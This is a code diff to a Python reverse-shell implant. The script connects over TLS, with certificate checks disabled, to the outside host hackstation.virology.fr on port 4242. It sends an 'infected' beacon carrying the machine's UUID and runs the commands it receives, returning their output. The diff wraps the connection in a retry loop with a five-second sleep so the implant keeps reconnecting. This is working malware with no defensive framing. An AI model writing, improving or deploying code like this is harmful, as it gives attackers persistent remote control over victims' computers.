@@ -6,6 +6,7 @@ from io import StringIO
 import contextlib
 import os
 import subprocess
+from time import sleep
 
 @contextlib.contextmanager
 def stdoutIO(stdout=None):
@@ -47,33 +48,40 @@ def execute_command(command, socket):
     socket.send(output.encode('utf-8'))
 
 def revshell():
-    context = ssl.create_default_context()
-
-    context.check_hostname = False
-    context.verify_mode = ssl.CERT_NONE
-
-    raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    s = context.wrap_socket(raw_socket, server_hostname="hackstation.virology.fr")
-
-    s.connect(("hackstation.virology.fr", 4242))
-    uid = os.popen("wmic csproduct get uuid").read().strip().splitlines()[-1]
-    s.send(f"infected|||{uid}|||".encode('utf-8'))
-
     while True:
-        command = ""
+        context = ssl.create_default_context()
+
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
+
+        raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        
+        s = context.wrap_socket(raw_socket, server_hostname="hackstation.virology.fr")
+
+        s.connect(("hackstation.virology.fr", 4242))
+        uid = os.popen("wmic csproduct get uuid").read().strip().splitlines()[-1]
+        s.send(f"infected|||{uid}|||".encode('utf-8'))
+
         while True:
-            part = s.recv(1024).decode('utf-8')
-            command += part
-            if len(part) < 1024:
+            command = ""
+            while True:
+                part = s.recv(1024).decode('utf-8')
+                if not part:
+                    command = "exit"
+                    break
+                command += part
+                if len(part) < 1024:
+                    break
+
+            if command.lower() == "exit":
                 break
+            else:
+                thread = threading.Thread(target=execute_command, args=(command, s))
+                thread.start()
 
-        if command.lower() == "exit":
-            break
-        else:
-            thread = threading.Thread(target=execute_command, args=(command, s))
-            thread.start()
+        sleep(5)
 
-    s.close()
+        s.close()
+
 
 revshell()
